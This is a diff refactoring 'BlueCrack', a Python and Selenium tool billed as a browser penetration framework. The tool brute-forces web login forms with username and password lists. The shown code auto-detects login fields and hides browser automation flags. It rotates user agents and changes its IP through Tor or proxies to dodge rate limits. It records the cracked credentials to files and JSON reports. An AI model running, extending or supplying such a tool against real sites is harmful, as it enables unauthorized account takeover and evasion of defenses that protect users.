@@ -1,36 +1,46 @@
-print(
-    """
-\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
-\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
-\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
-\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
-\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
-\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
+#!/usr/bin/env python3
 """
-)
+BlueCrack — Advanced Browser Penetration Framework
+===================================================
+Hydra-style brute-force tester powered by Selenium WebDriver.
+Supports both a PyQt6 GUI and a full-featured CLI with interactive wizard.
+"""
+
+__version__ = "2.0.0"
+
+# ═══════════════════════════════════════════════════════════════════
+# IMPORTS
+# ═══════════════════════════════════════════════════════════════════
 import argparse
+import builtins
+import json
+import os
+import random
+import signal
+import sys
 import threading
 import time
-import random
-import os
-import sys
-import signal
+from datetime import datetime
 from queue import Queue
+from typing import Any, Dict, List, Optional, Set, Tuple
 
 from selenium import webdriver
 from selenium.common.exceptions import (
     NoSuchElementException,
-    WebDriverException,
     TimeoutException,
+    WebDriverException,
 )
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.ui import WebDriverWait
+
 import keyboard
 
 # Optional: PyQt6 GUI
 try:
+    from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
+    from PyQt6.QtGui import QFont, QColor, QShortcut, QKeySequence, QIcon
     from PyQt6.QtWidgets import (
         QApplication,
         QWidget,
@@ -55,8 +65,6 @@ try:
         QScrollArea,
         QSizePolicy,
     )
-    from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
-    from PyQt6.QtGui import QFont, QColor, QShortcut, QKeySequence, QIcon
 
     HAS_PYQT = True
 except ImportError:
@@ -71,20 +79,129 @@ try:
 except ImportError:
     HAS_STEM = False
 
+
+# ═══════════════════════════════════════════════════════════════════
+# CONSTANTS
+# ═══════════════════════════════════════════════════════════════════
+CSS_PATH_JS: str = """
+function cssPath(el){
+    if(!el) return null;
+    var p=[];
+    while(el.nodeType===1){
+        var s=el.nodeName.toLowerCase();
+        if(el.id){
+            s+='#'+el.id;
+            p.unshift(s);
+            break;
+        } else {
+            var sib=el, n=1;
+            while(sib=sib.previousElementSibling){
+                if(sib.nodeName.toLowerCase()==s) n++;
+            }
+            if(n!=1) s+=':nth-of-type('+n+')';
+        }
+        p.unshift(s);
+        el=el.parentNode;
+    }
+    return p.join(' > ');
+}
+return cssPath(arguments[0]);
+"""
+
+AUTO_DETECT_JS: str = """
+window._autoFindFields = function() {
+    let passwordField = document.querySelector('input[type="password"]');
+    let userField = null;
+    if (passwordField) {
+        let inputs = Array.from(
+            passwordField.form
+                ? passwordField.form.querySelectorAll('input')
+                : document.querySelectorAll('input')
+        );
+        for (let el of inputs) {
+            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
+                userField = el;
+                break;
+            }
+        }
+    }
+    let ucss = userField
+        ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : ''))
+        : null;
+    let pcss = passwordField
+        ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : ''))
+        : null;
+    return [ucss, pcss];
+};
+"""
+
+CLICK_LISTENER_JS: str = """
+document.addEventListener('click', function(e){ window._lastClicked = e.target; });
+"""
+
+DEFAULT_USER_AGENTS: List[str] = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+]
+
+DEFAULT_LIMIT_TEXT: str = "too many requests"
+
+# ANSI color helpers
+_GREEN = "\033[32m"
+_RED = "\033[31m"
+_YELLOW = "\033[33m"
+_CYAN = "\033[36m"
+_BLUE = "\033[34m"
+_RESET = "\033[0m"
+_BOLD = "\033[1m"
+
 # ── Graceful stop flag (shared between CLI & GUI) ──
-_GLOBAL_STOP = threading.Event()
+_GLOBAL_STOP: threading.Event = threading.Event()
+_FOUND_EVENT: threading.Event = threading.Event()
 
 
-def _signal_handler(sig, frame):
-    print("\n[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...")
+# ═══════════════════════════════════════════════════════════════════
+# HELPER FUNCTIONS
+# ═══════════════════════════════════════════════════════════════════
+def print_banner() -> None:
+    """Print the BlueCrack ASCII art banner."""
+    print(
+        """
+\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
+\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
+\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
+\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
+\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
+\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
+"""
+    )
+
+
+print_banner()
+
+
+def _signal_handler(sig: int, frame: Any) -> None:
+    """Handle Ctrl+C / Ctrl+X for graceful shutdown."""
+    print(f"\n{_YELLOW}[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...{_RESET}")
     _GLOBAL_STOP.set()
+    _FOUND_EVENT.set()
 
 
 signal.signal(signal.SIGINT, _signal_handler)
 
 
-def change_tor_ip(control_port=9051, password=None):
-    """Request a new Tor identity (new IP)."""
+def change_tor_ip(control_port: int = 9051, password: Optional[str] = None) -> bool:
+    """Request a new Tor identity (new IP).
+
+    Args:
+        control_port: Tor control port number.
+        password: Optional authentication password for the Tor controller.
+
+    Returns:
+        True if identity was successfully changed, False otherwise.
+    """
     if not HAS_STEM:
         return False
     try:
@@ -96,12 +213,109 @@ def change_tor_ip(control_port=9051, password=None):
             ctrl.signal(TorSignal.NEWNYM)
             return True
     except Exception as e:
-        print(f"[-] Tor IP shift failed: {e}")
+        print(f"{_RED}[-] Tor IP shift failed: {e}{_RESET}")
         return False
 
 
-# CLI ARGUMENTS (HYDRA STYLE)
-parser = argparse.ArgumentParser(description="Hydra-style Browser Tester")
+def build_chrome_options(ctx: Dict[str, Any]) -> webdriver.ChromeOptions:
+    """Build ChromeOptions from the given context dictionary.
+
+    Args:
+        ctx: Configuration dictionary with keys like 'headless', 'use_tor', 'proxies', etc.
+
+    Returns:
+        Configured ChromeOptions instance.
+    """
+    options = webdriver.ChromeOptions()
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option("useAutomationExtension", False)
+    options.add_argument("--disable-blink-features=AutomationControlled")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")
+
+    if ctx.get("use_tor"):
+        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
+    elif ctx.get("proxies"):
+        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")
+
+    if ctx.get("headless"):
+        options.add_argument("--headless=new")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--window-size=1920x1080")
+
+    return options
+
+
+def create_driver_safe(
+    options: webdriver.ChromeOptions, max_retries: int = 3
+) -> Optional[webdriver.Chrome]:
+    """Create a Chrome WebDriver with retry logic.
+
+    Args:
+        options: Chrome options to use.
+        max_retries: Maximum number of creation attempts.
+
+    Returns:
+        A Chrome WebDriver instance, or None if all retries failed.
+    """
+    for attempt in range(max_retries):
+        try:
+            wd = webdriver.Chrome(options=options)
+            return wd
+        except WebDriverException as e:
+            if attempt < max_retries - 1:
+                time.sleep(1)
+            else:
+                return None
+        except Exception as e:
+            if attempt < max_retries - 1:
+                time.sleep(1)
+            else:
+                return None
+    return None
+
+
+def _save_json_report(
+    report_path: str,
+    target_url: str,
+    metrics: Dict[str, int],
+    found_creds: List[Tuple[str, str]],
+    start_time: float,
+    end_time: float,
+) -> None:
+    """Save a JSON report of the attack results.
+
+    Args:
+        report_path: Output file path for the JSON report.
+        target_url: The target URL that was tested.
+        metrics: Dictionary of attack metrics.
+        found_creds: List of (username, password) tuples found.
+        start_time: Unix timestamp when attack started.
+        end_time: Unix timestamp when attack ended.
+    """
+    report = {
+        "version": __version__,
+        "target_url": target_url,
+        "start_time": datetime.fromtimestamp(start_time).isoformat(),
+        "end_time": datetime.fromtimestamp(end_time).isoformat(),
+        "duration_seconds": round(end_time - start_time, 2),
+        "metrics": metrics,
+        "credentials_found": [{"username": u, "password": p} for u, p in found_creds],
+    }
+    try:
+        with open(report_path, "w", encoding="utf-8") as f:
+            json.dump(report, f, indent=2, ensure_ascii=False)
+    except Exception:
+        pass
+
+
+# ═══════════════════════════════════════════════════════════════════
+# ARGPARSE SETUP
+# ═══════════════════════════════════════════════════════════════════
+parser = argparse.ArgumentParser(
+    description="BlueCrack — Advanced Browser Penetration Framework"
+)
 
 # USERNAME INPUT
 parser.add_argument("-u", "--user", dest="username", help="single username to test")
@@ -115,7 +329,7 @@ parser.add_argument(
     "-P", "--passlist", dest="passfile", help="file containing list of passwords"
 )
 
-# OTHER
+# ENGINE
 parser.add_argument("--threads", type=int, default=1, help="number of threads")
 parser.add_argument("--url", help="login page URL")
 parser.add_argument(
@@ -138,7 +352,9 @@ parser.add_argument(
     help="delay between natural attempts to stay stealthy",
 )
 parser.add_argument(
-    "--limit-text", default="too many requests", help="text confirming rate limit hit"
+    "--limit-text",
+    default=DEFAULT_LIMIT_TEXT,
+    help="text confirming rate limit hit",
 )
 parser.add_argument(
     "--cooldown",
@@ -168,7 +384,32 @@ parser.add_argument(
     "--gui", action="store_true", help="launch the PyQt6 GUI instead of CLI"
 )
 
+# ── New CLI arguments ──
+parser.add_argument(
+    "--max-attempts",
+    type=int,
+    default=0,
+    help="maximum total attempts (0 = unlimited)",
+)
+parser.add_argument(
+    "--continue-after-success",
+    action="store_true",
+    help="continue testing after finding credentials",
+)
+parser.add_argument(
+    "--output",
+    type=str,
+    default="credentials.txt",
+    help="output file path for found credentials (default: credentials.txt)",
+)
+parser.add_argument(
+    "--json-report",
+    action="store_true",
+    help="save a JSON report when finished",
+)
+
 args = parser.parse_args()
+
 
 # ═══════════════════════════════════════════════════════════════════
 # ██  GUI MODE  ██
@@ -176,35 +417,46 @@ args = parser.parse_args()
 if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
     if not HAS_PYQT:
         raise SystemExit("PyQt6 not installed. Run: pip install PyQt6 stem")
+
     # ── Import CUPP helpers ──
-    _cupp_dir = os.path.dirname(os.path.abspath(__file__))
+    _cupp_dir: str = os.path.dirname(os.path.abspath(__file__))
     sys.path.insert(0, _cupp_dir)
     try:
         import cupp as _cupp_mod
     except ImportError:
         _cupp_mod = None
 
-    # ─────────────────── Dark Theme Stylesheet ───────────────────
-    DARK_STYLE = """
+    # ─────────────────── Premium Glassmorphism Dark Theme ───────────────────
+    DARK_STYLE: str = """
+    /* ═══ Global ═══ */
     QWidget {
-        background-color: #0d1117;
-        color: #c9d1d9;
+        background-color: #0a0e17;
+        color: #e2e8f0;
+        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+        font-size: 13px;
     }
+
+    /* ═══ Group Boxes — Glassmorphism cards ═══ */
     QGroupBox {
-        border: 1px solid #30363d;
-        border-radius: 8px;
-        margin-top: 16px;
-        padding: 24px 10px 10px 10px;
+        border: 1px solid rgba(148, 163, 184, 0.1);
+        border-radius: 12px;
+        margin-top: 18px;
+        padding: 26px 14px 14px 14px;
         font-weight: bold;
-        color: #58a6ff;
+        font-size: 13px;
+        color: #4f8cff;
+        background-color: rgba(15, 23, 42, 0.8);
     }
     QGroupBox::title {
         subcontrol-origin: margin;
         subcontrol-position: top left;
-        left: 14px;
+        left: 16px;
         top: 4px;
-        padding: 0 6px;
+        padding: 0 8px;
+        color: #4f8cff;
     }
+
+    /* ═══ Scroll Areas ═══ */
     QScrollArea {
         border: none;
         background: transparent;
@@ -212,132 +464,360 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
     QScrollArea > QWidget > QWidget {
         background: transparent;
     }
+    QScrollBar:vertical {
+        background: rgba(15, 23, 42, 0.4);
+        width: 8px;
+        border-radius: 4px;
+    }
+    QScrollBar::handle:vertical {
+        background: rgba(79, 140, 255, 0.3);
+        border-radius: 4px;
+        min-height: 30px;
+    }
+    QScrollBar::handle:vertical:hover {
+        background: rgba(79, 140, 255, 0.6);
+    }
+    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
+        height: 0;
+    }
+
+    /* ═══ Tab Widget ═══ */
     QTabWidget::pane {
-        border: 1px solid #30363d;
-        border-radius: 6px;
-        background: #0d1117;
+        border: 1px solid rgba(148, 163, 184, 0.1);
+        border-radius: 8px;
+        background: rgba(15, 23, 42, 0.5);
+        top: -1px;
     }
     QTabBar::tab {
-        background: #161b22;
-        color: #8b949e;
-        border: 1px solid #30363d;
-        padding: 8px 20px;
-        border-top-left-radius: 6px;
-        border-top-right-radius: 6px;
+        background: rgba(15, 23, 42, 0.4);
+        color: #94a3b8;
+        border: none;
+        border-bottom: 2px solid transparent;
+        padding: 10px 22px;
         margin-right: 2px;
+        font-weight: 600;
+        font-size: 13px;
+    }
+    QTabBar::tab:hover {
+        color: #e2e8f0;
+        background: rgba(79, 140, 255, 0.08);
     }
     QTabBar::tab:selected {
-        background: #0d1117;
-        color: #58a6ff;
-        border-bottom: 2px solid #58a6ff;
+        color: #4f8cff;
+        background: rgba(15, 23, 42, 0.8);
+        border-bottom: 2px solid #4f8cff;
     }
+
+    /* ═══ Input Fields ═══ */
     QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
-        background-color: #161b22;
-        border: 1px solid #30363d;
-        border-radius: 6px;
-        padding: 6px 10px;
-        color: #c9d1d9;
+        background-color: rgba(15, 23, 42, 0.6);
+        border: 1px solid rgba(148, 163, 184, 0.15);
+        border-radius: 8px;
+        padding: 8px 12px;
+        color: #e2e8f0;
         min-height: 20px;
+        selection-background-color: rgba(79, 140, 255, 0.3);
     }
-    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus {
-        border: 1px solid #58a6ff;
+    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus, QComboBox:focus {
+        border: 1px solid #4f8cff;
+        background-color: rgba(15, 23, 42, 0.8);
     }
+    QLineEdit::placeholder {
+        color: #475569;
+    }
+
+    /* ═══ Buttons — Base ═══ */
     QPushButton {
-        background-color: #21262d;
-        border: 1px solid #30363d;
-        border-radius: 6px;
-        padding: 8px 16px;
-        color: #c9d1d9;
-        font-weight: bold;
+        background-color: rgba(30, 41, 59, 0.8);
+        border: 1px solid rgba(148, 163, 184, 0.15);
+        border-radius: 8px;
+        padding: 9px 18px;
+        color: #e2e8f0;
+        font-weight: 600;
     }
     QPushButton:hover {
-        background-color: #30363d;
-        border-color: #58a6ff;
+        background-color: rgba(51, 65, 85, 0.9);
+        border-color: #4f8cff;
     }
     QPushButton:pressed {
-        background-color: #161b22;
+        background-color: rgba(15, 23, 42, 0.9);
     }
     QPushButton:disabled {
-        background-color: #161b22;
-        color: #484f58;
+        background-color: rgba(15, 23, 42, 0.4);
+        color: #334155;
+        border-color: rgba(148, 163, 184, 0.05);
     }
+
+    /* ═══ Checkboxes ═══ */
     QCheckBox {
-        spacing: 8px;
-        color: #c9d1d9;
+        spacing: 10px;
+        color: #e2e8f0;
     }
     QCheckBox::indicator {
-        width: 16px; height: 16px;
-        border-radius: 4px;
-        border: 1px solid #30363d;
-        background: #161b22;
+        width: 18px;
+        height: 18px;
+        border-radius: 5px;
+        border: 1px solid rgba(148, 163, 184, 0.2);
+        background: rgba(15, 23, 42, 0.6);
+    }
+    QCheckBox::indicator:hover {
+        border-color: #4f8cff;
     }
     QCheckBox::indicator:checked {
-        background-color: #238636;
-        border-color: #238636;
+        background-color: #00e676;
+        border-color: #00e676;
     }
+
+    /* ═══ Log Terminal ═══ */
     QTextEdit {
-        background-color: #010409;
-        border: 1px solid #30363d;
-        border-radius: 6px;
+        background-color: #020617;
+        border: 1px solid rgba(148, 163, 184, 0.1);
+        border-radius: 8px;
         color: #39d353;
-        font-family: 'Cascadia Code', 'Consolas', monospace;
+        font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
         font-size: 12px;
-        padding: 8px;
+        padding: 10px;
+        selection-background-color: rgba(57, 211, 83, 0.2);
     }
+
+    /* ═══ Progress Bar ═══ */
     QProgressBar {
-        background-color: #161b22;
-        border: 1px solid #30363d;
-        border-radius: 6px;
+        background-color: rgba(15, 23, 42, 0.6);
+        border: 1px solid rgba(148, 163, 184, 0.1);
+        border-radius: 10px;
         text-align: center;
-        color: #c9d1d9;
-        height: 22px;
+        color: #e2e8f0;
+        height: 24px;
+        font-weight: 600;
+        font-size: 11px;
     }
     QProgressBar::chunk {
-        background-color: #238636;
-        border-radius: 5px;
+        border-radius: 9px;
+        background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
+            stop:0 #4f8cff, stop:1 #00e676);
     }
+
+    /* ═══ Named Labels ═══ */
     QLabel#titleLabel {
-        font-size: 28px;
+        font-size: 32px;
         font-weight: bold;
-        color: #58a6ff;
+        color: #4f8cff;
     }
     QLabel#subtitleLabel {
         font-size: 12px;
-        color: #8b949e;
+        color: #94a3b8;
+        font-weight: 400;
+    }
+    QLabel#statLabel {
+        font-size: 12px;
+        color: #94a3b8;
+        font-weight: 600;
+        padding: 2px 8px;
+    }
+    QLabel#statValue {
+        font-size: 13px;
+        color: #e2e8f0;
+        font-weight: 700;
+        padding: 2px 8px;
+    }
+
+    /* ═══ Splitter ═══ */
+    QSplitter::handle {
+        background: rgba(79, 140, 255, 0.15);
+        height: 3px;
+        border-radius: 1px;
+    }
+    QSplitter::handle:hover {
+        background: rgba(79, 140, 255, 0.4);
+    }
+
+    /* ═══ Form label styling ═══ */
+    QFormLayout QLabel {
+        color: #94a3b8;
+        font-weight: 500;
+    }
+
+    /* ═══ Tooltips ═══ */
+    QToolTip {
+        background-color: rgba(15, 23, 42, 0.95);
+        color: #e2e8f0;
+        border: 1px solid rgba(79, 140, 255, 0.3);
+        border-radius: 6px;
+        padding: 6px 10px;
+        font-size: 12px;
+    }
+    """
+
+    LIGHT_STYLE: str = """
+    QWidget {
+        background-color: #f8fafc;
+        color: #1e293b;
+        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+        font-size: 13px;
+    }
+    QGroupBox {
+        border: 1px solid #e2e8f0;
+        border-radius: 12px;
+        margin-top: 18px;
+        padding: 26px 14px 14px 14px;
+        font-weight: bold;
+        color: #3b82f6;
+        background-color: #ffffff;
+    }
+    QGroupBox::title {
+        subcontrol-origin: margin;
+        subcontrol-position: top left;
+        left: 16px;
+        top: 4px;
+        padding: 0 8px;
+    }
+    QScrollArea { border: none; background: transparent; }
+    QScrollArea > QWidget > QWidget { background: transparent; }
+    QTabWidget::pane {
+        border: 1px solid #e2e8f0;
+        border-radius: 8px;
+        background: #ffffff;
+    }
+    QTabBar::tab {
+        background: #f1f5f9;
+        color: #64748b;
+        border: none;
+        border-bottom: 2px solid transparent;
+        padding: 10px 22px;
+        margin-right: 2px;
+        font-weight: 600;
+    }
+    QTabBar::tab:selected {
+        color: #3b82f6;
+        background: #ffffff;
+        border-bottom: 2px solid #3b82f6;
+    }
+    QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
+        background-color: #ffffff;
+        border: 1px solid #e2e8f0;
+        border-radius: 8px;
+        padding: 8px 12px;
+        color: #1e293b;
+        min-height: 20px;
+    }
+    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus {
+        border: 1px solid #3b82f6;
+    }
+    QPushButton {
+        background-color: #f1f5f9;
+        border: 1px solid #e2e8f0;
+        border-radius: 8px;
+        padding: 9px 18px;
+        color: #1e293b;
+        font-weight: 600;
+    }
+    QPushButton:hover { background-color: #e2e8f0; border-color: #3b82f6; }
+    QPushButton:pressed { background-color: #cbd5e1; }
+    QPushButton:disabled { background-color: #f1f5f9; color: #94a3b8; }
+    QCheckBox { spacing: 10px; color: #1e293b; }
+    QCheckBox::indicator {
+        width: 18px; height: 18px; border-radius: 5px;
+        border: 1px solid #cbd5e1; background: #ffffff;
+    }
+    QCheckBox::indicator:checked { background-color: #22c55e; border-color: #22c55e; }
+    QTextEdit {
+        background-color: #1e293b;
+        border: 1px solid #e2e8f0;
+        border-radius: 8px;
+        color: #4ade80;
+        font-family: 'Cascadia Code', 'Consolas', monospace;
+        font-size: 12px;
+        padding: 10px;
+    }
+    QProgressBar {
+        background-color: #e2e8f0;
+        border: 1px solid #cbd5e1;
+        border-radius: 10px;
+        text-align: center;
+        color: #1e293b;
+        height: 24px;
+    }
+    QProgressBar::chunk {
+        border-radius: 9px;
+        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3b82f6, stop:1 #22c55e);
+    }
+    QLabel#titleLabel { font-size: 32px; font-weight: bold; color: #3b82f6; }
+    QLabel#subtitleLabel { font-size: 12px; color: #64748b; }
+    QLabel#statLabel { font-size: 12px; color: #64748b; font-weight: 600; padding: 2px 8px; }
+    QLabel#statValue { font-size: 13px; color: #1e293b; font-weight: 700; padding: 2px 8px; }
+    QSplitter::handle { background: #e2e8f0; height: 3px; }
+    QToolTip {
+        background-color: #ffffff; color: #1e293b;
+        border: 1px solid #e2e8f0; border-radius: 6px; padding: 6px 10px;
     }
     """
 
     # ─────────────────── GUI Worker Thread ───────────────────
     class GuiWorkerThread(QThread):
+        """Worker thread that runs the brute-force attack via Selenium WebDriver.
+
+        Emits log, progress, metrics, and finished signals to the GUI.
+        """
+
         log_signal = pyqtSignal(str)
         progress_signal = pyqtSignal(int, int)  # current, total
         finished_signal = pyqtSignal(bool, str)  # found, message
+        metrics_signal = pyqtSignal(dict)  # live metrics for footer
 
-        def __init__(self, ctx):
+        def __init__(self, ctx: Dict[str, Any]) -> None:
             super().__init__()
-            self.ctx = ctx
-            self._stop_flag = threading.Event()
+            self.ctx: Dict[str, Any] = ctx
+            self._stop_flag: threading.Event = threading.Event()
+            self._start_time: float = 0.0
 
-        def request_stop(self):
+        def request_stop(self) -> None:
+            """Signal the worker to stop gracefully."""
             self._stop_flag.set()
             _GLOBAL_STOP.set()
 
-        def log(self, msg):
+        def log(self, msg: str) -> None:
+            """Emit a log message to the GUI."""
             self.log_signal.emit(msg)
 
-        def run(self):
+        def run(self) -> None:
+            """Main worker execution: detect selectors then launch attack threads."""
             _GLOBAL_STOP.clear()
             ctx = self.ctx
-            users = ctx["users"]
-            passwords = ctx["passwords"]
-            total = len(users) * len(passwords)
-            done = [0]
-            found_users = set()
-            multiple_users = len(users) > 1
+            users: List[str] = ctx["users"]
+            passwords: List[str] = ctx["passwords"]
+            total: int = len(users) * len(passwords)
+            done: List[int] = [0]
+            found_users: Set[str] = set()
+            found_creds: List[Tuple[str, str]] = []
+            _found_lock = threading.Lock()
+            multiple_users: bool = len(users) > 1
+            success_msg: str = ctx.get("success_msg", "").lower().strip()
+            max_attempts: int = ctx.get("max_attempts", 0)
+            continue_after: bool = ctx.get("continue_after_success", False)
 
-            q = Queue(maxsize=1000)
+            # Retry budget: track retries per (user, pwd)
+            retry_budget: Dict[Tuple[str, str], int] = {}
+            retry_lock = threading.Lock()
+            MAX_RETRIES_PER_COMBO: int = 3
 
-            def populate():
+            # Metrics
+            metrics: Dict[str, int] = {
+                "attempted": 0,
+                "successes": 0,
+                "failures": 0,
+                "errors": 0,
+                "rate_limit_hits": 0,
+                "skipped_empty": 0,
+                "skipped_solved_user": 0,
+                "requeued": 0,
+                "rate_retry_exhausted": 0,
+            }
+            metrics_lock = threading.Lock()
+            self._start_time = time.time()
+
+            q: Queue = Queue(maxsize=1000)
+
+            def populate() -> None:
                 for u in users:
                     for p in passwords:
                         q.put((u, p))
@@ -346,38 +826,18 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
 
             # Setup driver for selector detection
             self.log("[*] Opening browser for selector setup...")
-            setup_driver = webdriver.Chrome()
+            setup_driver = create_driver_safe(webdriver.ChromeOptions())
+            if setup_driver is None:
+                self.finished_signal.emit(False, "Failed to create setup browser.")
+                return
+
             try:
                 setup_driver.get(ctx["target_url"])
                 time.sleep(2)
-                # Auto-detect
-                setup_driver.execute_script(
-                    """
-                    document.addEventListener('click', function(e){ window._lastClicked = e.target; });
-                """
-                )
-                setup_driver.execute_script(
-                    """
-                    window._autoFindFields = function() {
-                        let passwordField = document.querySelector('input[type="password"]');
-                        let userField = null;
-                        if (passwordField) {
-                            let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
-                            for (let el of inputs) {
-                                if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
-                                    userField = el; break;
-                                }
-                            }
-                        }
-                        let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
-                        let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
-                        return [ucss, pcss];
-                    };
-                """
-                )
-                detected = setup_driver.execute_script(
-                    "return window._autoFindFields();"
-                )
+                setup_driver.execute_script(CLICK_LISTENER_JS)
+                setup_driver.execute_script(AUTO_DETECT_JS)
+                detected = setup_driver.execute_script("return window._autoFindFields();")
+
                 if detected and detected[0] and detected[1]:
                     ctx["username_selector"], ctx["password_selector"] = detected
                     self.log(f"[+] Auto-detected  User: {detected[0]}")
@@ -398,13 +858,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                                 "return window._lastClicked"
                             )
                             if elem:
-                                css = setup_driver.execute_script(
-                                    """
-                                function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
-                                return cssPath(arguments[0]);
-                                """,
-                                    elem,
-                                )
+                                css = setup_driver.execute_script(CSS_PATH_JS, elem)
                                 if css:
                                     ctx["username_selector"] = css
                                     self.log(f"[+] Username LOCKED: {css}")
@@ -414,13 +868,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                                 "return window._lastClicked"
                             )
                             if elem:
-                                css = setup_driver.execute_script(
-                                    """
-                                function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
-                                return cssPath(arguments[0]);
-                                """,
-                                    elem,
-                                )
+                                css = setup_driver.execute_script(CSS_PATH_JS, elem)
                                 if css:
                                     ctx["password_selector"] = css
                                     self.log(f"[+] Password LOCKED: {css}")
@@ -430,66 +878,58 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 self.log(f"[-] Setup error: {e}")
                 try:
                     setup_driver.quit()
-                except:
+                except Exception:
                     pass
                 self.finished_signal.emit(False, str(e))
                 return
             try:
                 setup_driver.quit()
-            except:
+            except Exception:
                 pass
 
             self.log(f"[*] Launching {ctx['threads']} worker thread(s)...")
 
-            def _run_worker():
-                options = webdriver.ChromeOptions()
-                options.add_experimental_option(
-                    "excludeSwitches", ["enable-automation"]
-                )
-                options.add_experimental_option("useAutomationExtension", False)
-                options.add_argument("--disable-blink-features=AutomationControlled")
-                options.add_argument("--no-sandbox")
-                options.add_argument("--disable-dev-shm-usage")
-                UA = [
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-                ]
